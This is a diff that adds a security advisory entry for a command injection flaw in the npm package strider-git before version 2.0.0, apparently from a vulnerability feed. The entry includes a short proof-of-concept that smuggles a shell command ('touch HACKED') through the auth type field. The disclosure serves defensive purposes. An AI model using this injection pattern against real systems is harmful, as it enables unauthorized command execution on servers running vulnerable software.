@@ -1,0 +1,31 @@
+---
+- id: snykio:npm:strider-git:572913
+  title: Command Injection
+  description: |
+    [strider-git][1] is a Strider provider for git repositories
+
+    Affected versions of this package are vulnerable to Command Injection.
+    ### PoC
+
+        var git = require("strider-git/lib");
+        git.getBranches({auth:{type:'ssaas;touch HACKED; ', privkey:'sss'}, url:'http://sss'}, '', function(){})
+
+
+
+    [1]: https://www.npmjs.com/package/strider-git
+  affected_package: strider-git
+  vulnerable_versions:
+  - "<2.0.0"
+  severity: high
+  package_manager: npm
+  cwe:
+  - CWE-78
+  disclosed_date: 2020-06-21
+  created_date: 2020-07-07
+  last_modified_date: 2020-07-07
+  credit:
+  - Mik317
+  references:
+  - https://github.com/Strider-CD/strider-git/commit/13da05fff05f7089dbb97a393be097deaadd2a9e
+  - https://github.com/Strider-CD/strider-git/issues/38
+  source_url: https://snyk.io/vuln/SNYK-JS-STRIDERGIT-572913
